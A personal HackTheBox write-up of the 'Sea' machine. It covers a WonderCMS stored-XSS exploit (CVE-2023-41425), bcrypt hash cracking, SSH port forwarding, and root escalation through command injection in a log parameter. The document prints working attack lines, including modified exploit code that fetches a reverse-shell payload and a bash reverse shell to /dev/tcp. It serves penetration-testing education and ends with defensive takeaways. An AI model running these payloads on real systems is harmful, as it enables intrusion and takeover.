# :trident: [Sea] – [Easy]

## :aerial_tramway: Attack Path Summary
A short, high-level narrative of how the machine was compromised:
- **Initial foothold** was obtained by exploiting CVE-2023-41425, a stored XSS vulnerability in WonderCMS, by submitting a crafted payload through the Contact form.
- **Post-exploitation enumeration** uncovered a database file containing a bcrypt-hashed password. Cracking it with Hashcat provided valid credentials for the user amay.
- Using **SSH port forwarding**, I accessed an internal disk management service. By intercepting and modifying a request, I injected a command into access.log, resulting in remote command execution and full root compromise.

## :dart: Objective
Sea is labeled as an “Easy” box on HackTheBox, but it still requires methodical thinking and solid fundamentals. At first glance, the target exposes only a minimal web interface with two pages—Home and How to Participate—the latter of which leads to a 404 despite containing a clickable link. The objective of this challenge is to identify a viable entry point into the machine, obtain access as the standard user, and ultimately escalate privileges to root.

---

## :bulb: Key Concepts / What You’ll Learn
- Enumeration tactics
	- Initial TCP scan to identify open ports
	- Perform full service & version detection
	- Enumerate web technologies through headers & tooling
	- File enumeration using ffuf
	- Searching github for information on software on web server
- Vulnerability type 
	- Stored XSS  
- Privilege escalation strategy
	- Remote Code Execution (RCE) via Burp  
- Tools Used (New & Familiar)  
	- Burp Proxy & Repeater
	- nmap 
	- ffuf 
	- hashcat

---

## :gear: Walkthrough

### :one: Reconnaissance / Enumeration

Let's start by running a nmap scan:

	nmap -sV -sC -A -o sea

* -sV - port service detection
* -sC - Run standard nmap scripts
* -A - OS type and version detection
* -o - output to file; in this case, a file named sea. By default, nmap saves to a text file unless otherwise specified.

![Screenshot of nmap command](/Assets/HtB/Sea/nmap.png)

So it appears we have two ports open: port 22 is running SSH, and port 80 appears to have a web server of some kind. Looking at the http-server-header, we can tell its an Apache server, so let's remember that in case it comes in handy later. 

Personally, I want to check out the web server to see if we can find anything interesting. While I'm working on that, I'm also going to run ffuf in the background in case anything comes up for us:

	ffuf -ic -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -u http://10.129.8.28:80/FUZZ

* -ic - ignore copyrights and other messages; basically fluff for our purposes
* -w - wordlist to use for fuzzing. Quickhits is an easy one to start with, as is common.txt
* -u - URL to start fuzzing directories on
* /FUZZ - the location you want to fuzz. In this example, I want to know if there are *any* directories on the web server. I'm trying to cast a moderately large net without gathering too much noise

![Screenshot of ffuf command](/Assets/HtB/Sea/ffuf_1.png)
![Screenshot of ffuf command](/Assets/HtB/Sea/ffuf_2.png)

The thing with ffuf is that it takes time, and it can be rather hit or miss. Fortunately, through this process I've learned some handy wordlists to incorporate into later tests, all of which are included within seclists:

* common.txt
* raft-medium (sp)
* quickhits.txt

While that's running, I'm going to try to enumerate the site a bit and see what info I can glean. We have two pages: "Home" and "How to Participate". Home has nothing of any real interest, but "How to Participate" has a link to a contact form. Unfortunately this page returns a 404 error. 

This is a common trick on HtB machines: let's add this IP to the /etc/hosts file. For some background, /etc/hosts is the file that your OS will first reference when trying to resolve a hostname. If the hostname is found in /etc/hosts, this will override DNS as a source of truth. Therefore, if we explictly tell Kali that the victim IP is actually sea.htb, then we can access it via the hostname. While not necessary, it makes finding other pages much easier. 

![Screenshot of /etc/hosts file](/Assets/HtB/Sea/etc_hosts.png)

Now when we access the "Contact" page, we are met with a contact form. 

![Screenshot of Contact form](/Assets/HtB/Sea/contact_form_blank.png)


While that's great to have, it still doesn't tell us what technology we're working with. However, I found another rather interesting trick I had never considered. Viewing the source code shows us a path to the .css style sheet:

![Screenshot of source code](/Assets/HtB/Sea/source_code.png)
![Screenshot of css file](/Assets/HtB/Sea/css_file.png)

To this point, I had never considered css as part of my attack chain but that's about to change. We can grab a seeminly unique snippet of this stylesheet and search it on Github. Check it out:

![Screenshot of github search results - code](/Assets/HtB/Sea/github_search.png)

Be sure to check "code" instead of "repositories":

![Screenshot of WonderCMS theme on Github](/Assets/HtB/Sea/bike_github.png)

So we are running WonderCMS. A quick search returns CVE-2023-41425, which is a stored XSS (cross site scripting vulnerability) within WonderCMS.  

![Screenshot of WonderCMS theme on Github](/Assets/HtB/Sea/WonderCVE_github.png)


### :two: Initial Foothold

Download the PoC:

	git clone https://github.com/prodigiousMind/CVE-2023-41425.git
	cd CVE-2023-41425
 
* Clone the directory from github into your current working directory, then change to that directory.

Running this script with no arguments spawns example usage:

![Screenshot of exploit example usage](/Assets/HtB/Sea/exploit_example.png)

so we need to specify the login page (loginURL), and the IP and port of our attacking machine. Through my research I was able to determine that the true login URL is http://sea.htb/loginURL (dropping the /wonderCMS/), and testing shows this is the right page:

![Screenshot of login page](/Assets/HtB/Sea/login.png)

So let's try it out and see what happens (be sure you set a listener on the corresponding port first):

	python3 exploit.py [IP ADDRESS] [PORT] 
	nc -lnvp 9001

![Screenshot of exploit example](/Assets/HtB/Sea/exploit_example.png)

So the script provided a new file: xss.js. It also provides a link to submit to the admin. In this case, there is a bot running on the machine that will click the link (I believe it runs every 2-3 minutes). 

Let's go back to that "Contact" form and check it out again. There is a link for us to include a URL (presumably to a website, i.e. LinkedIn or Github), but we may be able to leverage this to our use. Fill out the form and input the URL provided by the script:

![Screenshot of Contact Form - Filled with XSS](/Assets/HtB/Sea/contact_form_filled.png)

Wait for a few moments, and we get...no shell. So it's not connecting to our listener for some reason. Taking a look at the exploit code shows some clues. Look at the below line:

	var urlRev = urlWithoutLogBase+"/?installModule=https://github.com/prodigiousMind/revshell/archive/refs/heads/main.zip&directoryName=violet&type=themes&token=" + token;

The script is trying to reach out to Github to download a zip file. Since HtB boxes don't have external access by design, we are going to have to download and locally host this file ourselves. Then we can change the code to point to our locally hosted web server instead of Github to download the zip.

Start by downloading the file (be sure you are in your exploit directory before downloading):

	wget https://github.com/prodigiousMind/revshell/archive/refs/heads/main.zip

Now change this address in the exploit code to reference our locally hosted web server (remove secure connection so we don't have to worry about certificates and whatnot):

	var urlRev = urlWithoutLogBase+"/?installModule=http://[LOCAL IP]:[WEB SERVER PORT]/main.zip&directoryName=violet&type=themes&token=" + token;

![Screenshot of changed exploit code](/Assets/HtB/Sea/exploit_code_changed_ip.png)

While we're at it, let's check xss.js as well. This file will be generated every time we run the exploit, but it can't hurt to understand better what is going on. Now, I will not claim to be an expert in javascript, so I'm going to share a new trick with you. Let's take the first portion of this script and verify its functionality in our browser console:

![Screenshot of XSS in browser console](/Assets/HtB/Sea/xss_console.png)

So it looks like urlWithoutLog shows the full host: http://sea.htb. However, urlWithoutLogBase only shows the root directory: /. So let's put this in context of the script:

	var urlWithoutLogBase = new URL(urlWithoutLog).pathname;
	var urlRev = urlWithoutLogBase+"/?installModule=https://github.com/prodigiousMind/revshell/archive/refs/heads/main.zip&directoryName=violet&type=themes&token=" + token;
	xhr3.open("GET", urlRev);

These are lines 6, 8 and 13, respectively. The script attempts to initialize a variable (urlWithoutLogBase) by appending a pathname method to urlWithoutLog. It then proceeds to initialize another variable, urlRev, by appending the location of the file to download to the end of urlWithoutBase. However, if we take our results from the browser console and follow the script's logic, what we are left with is:

	/+/?installModule=https://github.com/prodigiousMind/revshell/archive/refs/heads/main.zip&directoryName=violet&type=themes&token=" + token;

OR

	//?installModule=https://github.com/prodigiousMind/revshell/archive/refs/heads/main.zip&directoryName=violet&type=themes&token=" + token;

So part of the issue is tbe broken URL, resulting from an improperly set variable. Fortunately, this part is simple: the pathname method is incorrect. We need to change this to host(name). We can confirm this in the browser console window as well:

![Screenshot of changed variable](/Assets/HtB/Sea/urlWithoutLogBase_changed.png)

Go back to exploit.py and change the method from pathname to hostname. While you are there, double check that you've also changed your local IP/port information in the script. Now restart your listener and resubmit the script. 

Watching the server, we can see the server is hit but main.zip is never accessed:

![Screenshot of web server failing zip](/Assets/HtB/Sea/web_server_zip_not_hit.png)

Since we still aren't getting the connection, let's take a look at the .zip file itself. 

	unzip main.zip
	cd revshell-main
	nano rev.php

![Screenshot of reverse shell code](/Assets/HtB/Sea/reverse_shell.png)

In the script, we have some variables for our ip and port, which are flagged to be changed. I tried to change these variables but I couldn't get the script to function how I needed. Looking at xss.js once more, there is one more interesting line near the end of the script:

	xhr5.open("GET", urlWithoutLogBase+"/themes/revshell-main/rev.php?lhost=" + ip + "&lport=" + port);

We notice two things here: 

- The script is accessing a file at /themes/revshell-main/rev.php
- At this point the script is appending our IP and Port to the URL

This method is not the intended approach, but it works well enough for our purposes. It also demonstrates how to work outside the box when you run into unexpected hurtles.

Leave the netcat listener running and try to hit the page: http://sea.htb/themes/revshell-main/rev.php. 

![Screenshot of browser with failed reverse shell connection](/Assets/HtB/Sea/daemon_error.png)

I took some time to test this app so I could understand what is going on; specifically, how this is a positive. In short, we have downloaded the file from our local web server; that's the file we are accessing in the browser now. However, for some reason we are not able to get back to our netcat listener. Let's change the URL to reflect our netcat listener, send the request, and wait for a connection:

	http://sea.htb/themes/revshell-main/rev.php?lhost=[local IP address]&lport=[Listening Port]

![Screenshot of reverse shell](/Assets/HtB/Sea/reverse_shell_successful.png)


### :three: User Compromise

Now that we've compromised the web server, let's pivot to user access and grab user.txt.

Let's start by getting our bearings:

	whoami   -> List current user
	pwd      -> Print working directory (where we are)
	ls -la   -> list folder contents with permissions

So we're in the root directory, but we aren't going to be able to access much as the web user. Refer back to our nmap scan and you'll see that we already know this is an Apache web server. Check the corresponding directory for any clues:

	cd /etc/apache2
	ls -la

![Screenshot of Apache web server folder](/Assets/HtB/Sea/contents_of_apache2_folder.png)

There are some interesting directories and files here. It looks like there are some configuration files, as well as files on this and other sites. Going into sites-enabled, you'll find one interesting file in particular:

![Screenshot of Apache web server folder](/Assets/HtB/Sea/sites_enabled.png)

From here, we now know the document root folder for this web server. This is honestly something I want to remember for future reference as this feels like a default location. But in the event that is not the case, or this were to change, I now have a way to further enumerate my environment to gain a stronger foothold.

![Screenshot of Apache web server folder](/Assets/HtB/Sea/pic_of_sea_conf.png)

Continue enumeration:

![Screenshot of document root folder](/Assets/HtB/Sea/document_root.png)

Okay, so we're going to switch it up now. Ha, just kidding! Enumerate again! (Please forgive my screenshot here; I got a little ahead of myself and didn't want to spoil the fun too soon)

![Screenshot of document root folder](/Assets/HtB/Sea/enumerate_doc_root.png)

Now grab that **database.js** file and see what it holds:

![Screenshot of database file](/Assets/HtB/Sea/reading_database_file.png)

You see that highlighted field right there? That's what I like to call a jackpot. Truthfully, I have absolutely NO idea what kind of hash/encryption this could be so I'll have to employ one of a few tools to do the trick.

Kali has a built-in hash identifier, but it can be rather hit or miss. For my purposes, I typically use an online hash identifier. There are plenty around, a simple search will direct you to one of a few. One thing to note is the backslashes in this password are escape characters; a way to tell the OS the following symbol is meant to be literal (as part of the password) and not serve a function (such as a newline or line break). Make sure you remove those backslashes before you try to identify the hash or it'll never work.


![Screenshot of database file](/Assets/HtB/Sea/analyzed_hash.png)

Now that we know its bcrypt, we can employ hashcat to crack the password for us. We are going to need a couple of things: the password to crack and a wordlist to run against the password. Hashcat will iterate through the wordlist and hash every item in the same algorithm specified (in this case, bycrpt). Once it finds a match, it returns the original entry (from the wordlist) to us. There is no way to crack a hash, but you can theoretically cause a collision which will reveal the contents of the hash. (I used my host instead of the VM to trim some time)

![Screenshot of cracked password](https://raw.githubusercontent.com/Nlytn/AppSec-Writeups/main/Assets/HtB/Sea/a.png)

Now that we have the password, we have to figure out who it's for. Let's just be simple about this: 

	cat /etc/passwd | grep sh$

* read /etc/passwd and return any lines that contain users that have access to bash. 

Looks like amay is our next target.

	su amay

When prompted, enter the newly found password to switch to amay. Grab user.txt and then start working on root escalation. 

### :four: Root Compromise
Unfortunately, amay is not able to run anything as sudo:

	sudo -l

Continue enumeration:

	ps -ef --forest
	cat /etc/fstab

It looks like processes run by other users are hidden (hidepid=2). 

Check what ports are listening:

	ss -lntp

So we have something running on port 8080, as well as 54457 (this port will likely be different for you; fortunately this one doesn't matter for our practice). Grab the two unusual port numbers and let's go to /etc to search for any clues on these

	grep -R [PORT NUMBER] 2>/dev/null

* 2>/dev/null -> sends all errors to null output; effectively suppresses errors so we don't have to sift through them

We find a hit for port 8080:

![Screenshot of cracked password](/Assets/HtB/Sea/grep_etc.png)

	cat /etc/systemd/system/multi-user.target.wants/monitoring.service

![Screenshot of cracked password](/Assets/HtB/Sea/monitoring_service.png)

This is appears to be a php interpreter running on port 8080, and the directory is /root/monitoring. Therefore, we can't directly access it. However, we can set up a port forward over SSH to gain access. 

**Why this works:**
The service is only accessible on the local machine. Any user is able to access the service, just not the directory, so long as that user is *on that system*. Since we obviously are not, we abuse SSH to forward our traffic to the same port on the local host. In effect, we are telling our computer to open a port and tunnel all traffic through SSH and deliver it to 127.0.0.1:8080 on the remote machine". We are abusing this permission to access resources that are meant for local access only. So we are circumventing the network segmentation/isolation principle, but not user privileges (yet). 

So we forward our traffic via SSH and hit the service through our browser to see what we have:

	ssh -L 8081:127.0.0.1:8080 amay@[REMOTE IP]  

![Screenshot of cracked password](/Assets/HtB/Sea/ssh_port_forward.png)


This tells SSH to bind our local port 8081 to port 8080 on the localhost of the ssh connection, using amay to connect. Access the address in your browser. Sign in with amay when prompted:

![Screenshot of cracked password](/Assets/HtB/Sea/monitoring_page.png)

Now open Burpsuite, route your traffic to the proxy, and send a request to analyze access.log (You may need to configure Firefox to intercept local traffic). Send request to repeater and repeat request to get response:

![Screenshot of cracked password](/Assets/HtB/Sea/intercepted_log.png)

The entries on this log are input sequentially such that newest entries are at the bottom of the log. Therefore, let's grab a unique item from the end of the response so we can use this as an anchor of sorts:

	<p class='error'>

Let's send a known bad request to see how the log reacts:

![Screenshot of cracked password](/Assets/HtB/Sea/curl_trigger_log.png)
![Screenshot of cracked password](/Assets/HtB/Sea/log_triggered.png)

And there's our entry at the very end. I tested this out a bit but was unable to get any PHP to execute through this method. I did try to read different files by leveraging the log_file paramater. 

It worked. I'm able to directly read the root flag. The strange part is that I had to also include an OS command, otherwise the file wouldn't read. So I threw in 'id' just for kicks, and that seems to do the trick.

![Screenshot of cracked password](/Assets/HtB/Sea/log_param_reading_files.png)


Now, I know what you're thinking: "C'mon now Nlytn, that's the cheap way out. I want FULL root access. I don't want to read one silly file. I want to read ALL OF THEM!". Well, to that I respond thusly: you're my kind of person. 

Going a step further, we can leverage this to get full RCE access to this server (albeit with some tricks). Fire up another netcat listener so we can start working on that reverse connection:

	nc -nlvp 9001

Since you've read this far, I'm going to cut to the chase. Once we establish our shell (which we will momentarily), it's going to die in roughly 2-3 seconds by design. So another trick I learned about today is **nohup**. I think of it as "no hangup", though I don't believe that is the official definition. It means if a termination signal is sent to your shell, its ignored. If the OS tells your shell it can't have candy at the store, then your shell grabs the candy and walks to the door anyway; it just doesn't listen. 

So we're going to slip a **nohup** into our reverse shell command, and therein gain and maintain our access:

	bash -c 'nohup bash -i >& /dev/tcp/10.10.15.169/9001 0>&1 &';#&

Then URL encode (ctrl + u)

![Screenshot of reverse shell attempt in Burp](/Assets/HtB/Sea/burp_reverse_shell.png)
![Screenshot of reverse shell connection](/Assets/HtB/Sea/reverse_shell.png)


---

## :brain: Understanding the Technique
Break down **why** each vulnerability worked:
- A foothold was obtained via a public exploit found in the CMS running on the server. Proper enumeration revealed the version, and coupled with research the vulnerability was discovered. A proof of concept (PoC) was discovered on Github, edited and uploaded to the victim for execution.
- Upon initial access, a user password was obtained from a database file and subsequently cracked.
- From here an internal system was exposed, leading to os command injection and resulting in full remote code execution  


---

## :lock: Security Takeaway
The security of the document structure of the web server should be more efficiently enforced via file permissions. Additionally, the vulnerability that was leveraged against the target was over a year old at time of publication so patches should have been applied prior to deployment. Where possible, passwords should never be saved in any documents or scripts; even when hashed there lies a risk that with enough time the password can be obtained. Finally, network segmentation and isolation should be reviewed and increased. Consider installing a WAF for this service or reviewing firewall rules to ensure external traffic is not able to reach internal assets.

---

## :writing_hand: Final Thoughts
This is my first box in a *long* time, but I want to continue the momentum. Hopefully these write-ups will assist with the journey. I truly enjoyed leveraging XSS against the target as this is something I've not gotten as much opportunity to experience. I ran into some blockers along the way, but while learning how to get around those I picked up some useful new tricks. Leveraging simple, innocuous items like CSS to identify the system is a neat trick I'm going to remember; its true that no detail is too small to notate. 

---

## :recycle: Notes
Completed: 2025-11-18  
Machine: https://app.hackthebox.com/machines/[ID]

This is the first of a long series of learning experiences on HtB, and as such I am leaning heavily on the shoulders of giants in this industry. For this walkthrough, I had to reference IppSec quite a bit to gain full understanding of attack methods and how to abuse the underlying technologies. As this series goes forward my hope is to stand on my own two feet and, with a little bit of luck, maybe stand with these giants one day. Until that day comes, I believe in giving credit where it is due:

[Link to IppSec Walkthrough Video](https://youtu.be/eXTQ3z7esjQ?si=F3ggzZzajyPZQNwo)
